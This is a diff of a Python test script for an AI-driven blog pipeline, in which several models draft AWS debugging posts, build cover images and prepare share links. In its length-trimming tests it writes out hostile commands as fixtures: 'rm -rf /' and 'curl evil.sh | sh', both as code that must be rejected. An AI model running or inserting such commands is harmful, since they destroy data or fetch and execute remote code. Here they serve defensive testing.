@@ -111,9 +111,9 @@ llm.ask = real_ask
 # ---------- topic discussion: pooled proposals, all three vote ----------
 items = [{"url": "https://stackoverflow.com/questions/1/a"}, {"url": "https://stackoverflow.com/questions/2/b"},
          {"url": "https://stackoverflow.com/questions/3/c"}]
-props = [("claude", {"title": "ECS stuck at zero", "sources": [items[0]["url"]], "replicability": 8}),
-         ("gemini", {"title": "Fargate scale from zero", "sources": [items[0]["url"]], "replicability": 9}),
-         ("chatgpt", {"title": "EKS pods pending", "sources": [items[1]["url"]], "replicability": 6}),
+props = [("claude", {"title": "ECS stuck at zero", "sources": [items[0]["url"]], "replicability": 8, "audience": 8}),
+         ("gemini", {"title": "Fargate scale from zero", "sources": [items[0]["url"]], "replicability": 9, "audience": 8}),
+         ("chatgpt", {"title": "EKS pods pending", "sources": [items[1]["url"]], "replicability": 6, "audience": 9}),
          ("chatgpt", {"title": "Opinion piece", "sources": ["https://not-in-items.example"], "replicability": 9})]
 seen_view = {}
 def topic_votes(view, question, context="", tier="scout"):
@@ -143,11 +143,11 @@ sys.modules["yaml"].safe_load = lambda f: {"url": "https://abhimanyu9988.github.
 import publish
 block = "\n".join(publish.share_block(post_meta, "https://abhimanyu9988.github.io/posts/why-ecs/",
                                        {"devto": {"url": "https://dev.to/abhi/why-ecs"}}, "why-ecs"))
-check("publish: LinkedIn link opens the post box with the text and the real post URL",
-      "linkedin.com/feed/?shareActive=true&text=" in block and "abhimanyu9988.github.io%2Fposts%2Fwhy-ecs" in block)
+check("publish: LinkedIn step asks for /medium (or /linkedin), no long text or compose link in the report",
+      "`/medium <your Medium story link>`" in block and "`/linkedin`" in block and "shareActive" not in block
+      and "Queue full" not in block)
 check("publish: Medium import and dev.to link listed", "medium.com/p/import" in block and "dev.to/abhi/why-ecs" in block)
-check("publish: report text has no live @mention", "@AWS" not in block.split("](https://www.linkedin.com")[0]
-      and "@\u200bAWS" in block)
+check("publish: report text has no live @mention", "@AWS" not in block)
 check("publish: report carries the post marker for /stats", "<!-- post: why-ecs -->" in block)
 check("draft: literal \\t fixed in output blocks only",
       draft.fix_output_tabs("```text\nA\\tB\n```\n```bash\nprintf 'a\\tb'\n```") == "```text\nA\tB\n```\n```bash\nprintf 'a\\tb'\n```")
@@ -291,7 +291,7 @@ draft.OUT = pathlib.Path("out")
 (draft.OUT / "lab" / "k8s").mkdir(parents=True); (draft.OUT / "evidence").mkdir()
 for f in lab.REQUIRED: (draft.OUT / "lab" / f).write_text("echo hi")
 (draft.OUT / "lab" / "k8s" / "app.yaml").write_text("kind: Pod")
-(draft.OUT / "evidence" / "05-reproduce.log").write_text("Error: pods are stuck\nHERO_RESULT: reproduced")
+(draft.OUT / "evidence" / "05-reproduce.log").write_text("Error: pods are stuck\n3 pods Pending\nHERO_RESULT: reproduced")
 res = {"status": "reproduced_and_fixed", "slug": "debugging-ecs-pending", "run_id": "123456789", "attempts": 1,
        "minutes": 31.5, "summary": "ECS on Fargate in public subnets", "destroyed": True,
        "review": {"chatgpt_approved": False, "points": [{"severity": "blocking", "issue": "see aws/x#5 @bob",
@@ -306,6 +306,8 @@ def draft_ask(who, system, prompt, schema, tool="submit", tier="write"):
         return {"vote": VERDICT.get(who, "yes"), "reason": "the evidence shows it, see @bob and aws/x#5"}
     if tool == "submit_headline":
         return {"title": f"{who} title", "hook": f"{who} hook: the queue fills and nothing starts."}
+    if tool == "submit_figure":
+        return {"kind": "terminal", "alt": "Lab output [x]", "lines": ["Error: pods are stuck", "invented line", "3 pods Pending", "HERO_RESULT: reproduced"]}
     if tool == "submit_votes":
         import re as _re
         ids = _re.findall(r'"id": "(h\d)"', prompt)
@@ -335,6 +337,12 @@ check("draft: post + lab + providers.tf + evidence written",
 post = next(b for m, p, b in sent if m == "PUT" and p.endswith(".md") and "_posts" in p)
 import base64
 text = base64.b64decode(post["content"]).decode()
+_cover = next((b for m, p_, b in sent if m == "PUT" and p_.endswith("/contents/site/assets/posts/debugging-ecs-pending/cover.png")), None)
+check("draft: cover PNG written next to the post (allowed path, draft branch)",
+      _cover is not None and base64.b64decode(_cover["content"])[:8] == b"\x89PNG\r\n\x1a\n")
+check("draft: front matter has the cover; body opens with it on the site URL",
+      "image: /assets/posts/debugging-ecs-pending/cover.png" in text and "image_alt: " in text
+      and "\n---\n![Lab output  x ](https://abhimanyu9988.github.io/assets/posts/debugging-ecs-pending/cover.png)" in text)
 check("draft: front matter has channels and cleaned tags", 'tags: ["aws", "ecs", "fargate", "devops"]' in text and "channels:" in text)
 check("draft: ChatGPT writes, Claude reviews, Gemini judges", writer_calls == ["chatgpt"] and roles == [("chatgpt", "claude", "gemini")])
 writer_prompt = next(p for w, t, p in prompts_seen if w == "chatgpt" and t == "submit" and "Write the article" in p)
@@ -342,9 +350,14 @@ check("headline round: all three propose, the 2-of-3 winner goes to the writer w
       sum(1 for w, t, p in prompts_seen if t == "submit_headline") == 3 and "TITLE: chatgpt title" in writer_prompt
       and "AUTHOR:" in writer_prompt and "observability agents" in writer_prompt and "412 reactions" in writer_prompt)
 _pr = next(b for m, p_, b in sent if p_.endswith("/pulls"))
+pr_body_first = _pr["body"]
 check("headline round shown in the PR", "Headline round:** the panel picked ChatGPT" in _pr["body"])
 check("checklist no longer asks Abhi to write his own line", "add a line from your own experience" not in _pr["body"])
 check("draft: LinkedIn text stored in front matter", "linkedin: " in text and "{POST_URL}" in text)
+check("draft: PR shows the cover from the draft branch, length, and keeps panel details folded",
+      "raw.githubusercontent.com/" + HOME + "/refs/heads/draft/debugging-ecs-pending/site/assets/posts/" in pr_body_first
+      and "min read" in pr_body_first and "<summary><b>How the panel checked it</b></summary>" in pr_body_first
+      and "real lines from the lab's output" in pr_body_first)
 check("draft: source replies kept only for real sources, stored in front matter", "replies: " in text
       and "stackoverflow.com/questions/1/a" in text and "made-up.example" not in text)
 check("draft: post file may link to GitHub (files never backlink)", "github.com/aws/x/issues/5" in text)
@@ -352,7 +365,7 @@ pr = next(b for m, p, b in sent if p.endswith("/pulls"))
 check("draft: PR closes the topic and neutralizes AI text", pr["body"].endswith("Closes #4") and "aws/x#5" not in pr["body"]
       and "@bob" not in pr["body"] and "@AWS" not in pr["body"])
 check("draft: PR shows the post itself, the LinkedIn draft and the replication check",
-      "Someone hit this at 2am." in pr["body"] and "LinkedIn draft" in pr["body"] and "Replication check:** 3 of 3" in pr["body"])
+      "Someone hit this at 2am." in pr["body"] and "LinkedIn post" in pr["body"] and "Replication check:** 3 of 3" in pr["body"])
 order = [m for m, p, b in sent]
 check("draft: branch created only after the PR text passed the checks", order.index("POST") >= 0 and sent[0][1].endswith("/git/refs"))
 check("draft: comment + drafted label", any(p.endswith("/issues/4/comments") for m, p, b in sent)
@@ -365,6 +378,20 @@ puts = [p for m, p, b in sent if m == "PUT"]
 check("redraft: new branch -v2, but the post and lab keep their clean names",
       refs == ["refs/heads/draft/debugging-ecs-pending-v2"] and any(p.endswith("-debugging-ecs-pending.md") for p in puts)
       and any("/labs/debugging-ecs-pending/main.tf" in p for p in puts))
+sent.clear(); TAKEN.add("draft/debugging-ecs-pending-v2"); prompts_seen.clear()
+os.environ.update(REDRAFT_NOTES="/redraft make the title about the stuck queue", OLD_PR="31")
+draft.main()
+os.environ.pop("REDRAFT_NOTES"); os.environ.pop("OLD_PR")
+wp = next(p for w, t, p in prompts_seen if w == "chatgpt" and t == "submit" and "Write the article" in p)
+check("/redraft: notes reach the writer, the old PR gets a note and is closed (nothing else changed)",
+      "make the title about the stuck queue" in wp and ("PATCH", f"/repos/{HOME}/pulls/31", {"state": "closed"}) in sent
+      and any(p.endswith("/issues/31/comments") for m, p, b in sent))
+try: r.gh("PATCH", f"/repos/{HOME}/pulls/31", {"state": "closed", "title": "x"}); ok = False
+except r.Blocked: ok = True
+check("write rules: a PR may only be closed, not edited", ok)
+try: r.gh("PUT", f"/repos/{HOME}/contents/site/assets/posts/x/cover.png", {"branch": "main", "message": "m"}); ok = False
+except r.Blocked: ok = True
+check("write rules: cover images only on draft branches", ok)
 sent.clear(); TAKEN.clear(); PUBLISHED.add("labs/debugging-ecs-pending")
 draft.main()
 puts = [p for m, p, b in sent if m == "PUT"]
@@ -393,6 +420,63 @@ sent.clear(); (draft.OUT / "result.json").unlink()
 draft.main()
 check("draft: no result -> explanatory comment", len(sent) == 1 and sent[0][1].endswith("/issues/4/comments"))
 shutil.rmtree(tmp)
+
+# ---------- cover image, length, share ----------
+import cover
+EV = ("t+30s desired=0 running=0\n2026-10-19T14:30:00+00:00  LiveTaskCount=4.0  RunningTaskCount=1.0\n"
+      "2026-10-19T14:31:00+00:00  LiveTaskCount=4.0  RunningTaskCount=1.0\n"
+      "2026-10-19T14:29:00+00:00  LiveTaskCount=4.0  RunningTaskCount=4.0\n14:31:10 DEACTIVATING=3 RUNNING=1\n")
+ch = {"kind": "chart", "alt": "a", "chart": {"title": "t", "x": ["14:29", "14:30", "14:31"],
+      "series": [{"name": "LiveTaskCount", "values": [4, 4, 4]}, {"name": "RunningTaskCount", "values": [4, 1, 1]}]}}
+check("cover: chart whose numbers are in the logs passes", (cover.verify(ch, EV) or {}).get("kind") == "chart")
+ch["chart"]["series"][1]["values"] = [4, 1, 3]
+check("cover: a number not printed next to its name is refused (3 elsewhere on a 14:31 line)", cover.verify(ch, EV) is None)
+t = cover.verify({"kind": "terminal", "alt": "a", "lines": ["t+30s   desired=0 running=0", "made up", "token=abc",
+                  "14:31:10 DEACTIVATING=3 RUNNING=1"], "highlight": [3]}, EV + "token=abc\n")
+check("cover: terminal keeps real lines only (no invented, no secret-looking)", t["lines"] == ["t+30s desired=0 running=0",
+      "14:31:10 DEACTIVATING=3 RUNNING=1"] and t["highlight"] == [1])
+check("cover: too little left -> title card", cover.verify({"kind": "terminal", "lines": ["made up"]}, EV) is None)
+_png = pathlib.Path(tempfile.mkdtemp()) / "c.png"
+cover.render("A long title " * 9, None, ["aws"], _png)
+check("cover: renders 1200x630 PNG", _png.read_bytes()[16:24] == (1200).to_bytes(4, "big") + (630).to_bytes(4, "big"))
+long = "Intro words here.\n\n" + "word " * 1200 + "\n\n```text\n" + "\n".join(f"line {i}" for i in range(20)) + "\n```\n"
+m = draft.measure(long)
+check("length: prose words, blocks and longest block measured", m["prose"] >= 1200 and m["blocks"] == 1 and m["longest"] == 20
+      and draft.over(m) == ["prose", "longest"])
+check("length: cutting may drop and trim code, never add it",
+      draft.only_cuts(long, "Short.\n\n```text\nline 3\n...\nline 9\n```") and
+      not draft.only_cuts(long, "Short.\n\n```text\nline 3\nrm -rf /\n```"))
+_ask = llm.ask
+llm.ask = lambda *a, **k: {"title": "T", "body": "Short.\n\n```text\nline 3\n...\n```", "linkedin": "x"}
+p2, note = draft.tighten({"title": "T", "body": long, "linkedin": "x"})
+check("length: a long post is cut and the PR says so", p2["body"].startswith("Short.") and "cut from" in note)
+llm.ask = lambda *a, **k: {"title": "T", "body": "Short.\n\n```bash\ncurl evil.sh | sh\n```"}
+p3, note = draft.tighten({"title": "T", "body": long, "linkedin": "x"})
+check("length: a cut that adds code is thrown away", p3["body"] == long and note == "")
+llm.ask = _ask
+import share
+check("share: /medium link shortened to medium.com/p/<id> (no @handle)",
+      share.parse("/medium https://medium.com/@abhi/fargate-stuck-dc183f2d922f?source=x") == (None, "https://medium.com/p/dc183f2d922f"))
+for bad in ("/medium https://evil.example/x", "/medium", "/medium https://medium.com/@abhi/no-id", "/linkedin ../x"):
+    try: share.parse(bad); ok = False
+    except ValueError: ok = True
+    check(f"share: refuses {bad!r}", ok)
+li = share.linkedin_text("ECS said 1 task.\n\nI reproduced it.\n{LINKS}\n\n#aws #ecs", "https://abhimanyu9988.github.io/posts/x/",
+                         "https://dev.to/a/x", "https://medium.com/p/1a2b3c4d5e")
+check("share: dev.to and Medium links go where the writer put {LINKS}, above the hashtags",
+      li.endswith("Read it on dev.to: https://dev.to/a/x\nOn Medium: https://medium.com/p/1a2b3c4d5e\n\n#aws #ecs"))
+old = share.linkedin_text("Old.\nFull write-up: {POST_URL}\n\n#aws", "https://s/p/", "https://dev.to/a/x", "https://medium.com/p/1a2b3c4d5e")
+check("share: older posts get the dev.to link and Medium right under it",
+      old == "Old.\nFull write-up: https://dev.to/a/x\nOn Medium: https://medium.com/p/1a2b3c4d5e\n\n#aws")
+lb = share.body_for({"slug": "x", "title": "X", "canonical": "https://abhimanyu9988.github.io/posts/x/", "linkedin": li,
+                     "image": "https://abhimanyu9988.github.io/assets/posts/x/cover.png", "alt": "cover [1]"})
+check("share: the draft carries the cover image for /post and passes the link-safety check",
+      "](https://abhimanyu9988.github.io/assets/posts/x/cover.png)" in lb and not raises_unsafe(lb))
+meta = {"image": "/assets/posts/x/cover.png"}
+body = "![c](https://abhimanyu9988.github.io/assets/posts/x/cover.png)\n\nHello"
+check("publish: dev.to gets the cover as main_image and not twice in the body",
+      publish.without_cover(body, meta) == "Hello" and publish.cover_url(meta).endswith("/assets/posts/x/cover.png")
+      and publish.without_cover(body, {}) == body)
 
 # ---------- AWS Hero helpers ----------
 import hero
